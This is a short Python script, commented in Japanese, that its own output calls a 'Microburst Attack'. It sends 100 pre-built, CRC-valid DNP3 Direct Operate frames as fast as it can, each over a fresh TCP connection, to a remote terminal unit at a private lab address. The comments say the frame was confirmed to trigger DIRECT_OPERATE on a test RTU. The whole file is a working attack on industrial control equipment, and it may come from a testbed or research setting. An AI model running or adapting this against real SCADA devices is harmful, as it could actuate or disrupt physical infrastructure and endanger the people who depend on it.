import socket
import time

TARGET_IP = "10.0.30.10"
TARGET_PORT = 20000
NUM_PACKETS = 100

# 検証済み: RTU側(target_rtu.py)で101/101件受信・DIRECT_OPERATE実行に成功した
# 実際のバイト列をそのまま使用する。CRC・Qualifier含め、値は一切いじらない。
# (Qualifier=0x00, CRC計算は同期バイトを含めた8バイトヘッダー全体に対して実施済み)
DNP3_FRAME_HEX = "056418c40400010090dbc0c0050c010000004101000000000000cd40000000ffff"
DNP3_FRAME = bytes.fromhex(DNP3_FRAME_HEX)


def main():
    print(f"[*] Starting Microburst Attack on {TARGET_IP}:{TARGET_PORT}")
    print(f"[*] Sending {NUM_PACKETS} valid DNP3 Direct Operate (FC=0x05) frames (CRC-validated) as fast as possible...")
    print(f"[*] Frame length: {len(DNP3_FRAME)} bytes")
    print(f"[*] Frame hex: {DNP3_FRAME.hex()}")

    # RTU側 (target_rtu.py) は1接続につき1回recv()した直後にソケットを
    # closeする実装のため、接続を使い回さず、送信のたびに新規接続を張る。
    sent_count = 0
    start = time.perf_counter()
    for i in range(NUM_PACKETS):
        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((TARGET_IP, TARGET_PORT))
            s.sendall(DNP3_FRAME)
            sent_count += 1
        except Exception as e:
            print(f"[-] Packet {i} error: {e}")
        finally:
            if s is not None:
                s.close()
    end = time.perf_counter()

    elapsed = end - start
    print(f"[+] Sent {sent_count}/{NUM_PACKETS} packets in {elapsed:.4f} seconds.")
    if elapsed > 0:
        print(f"[+] Burst Rate: {sent_count / elapsed:.2f} packets/sec")

    print("[*] Microburst Attack Completed.")


if __name__ == "__main__":
    main()
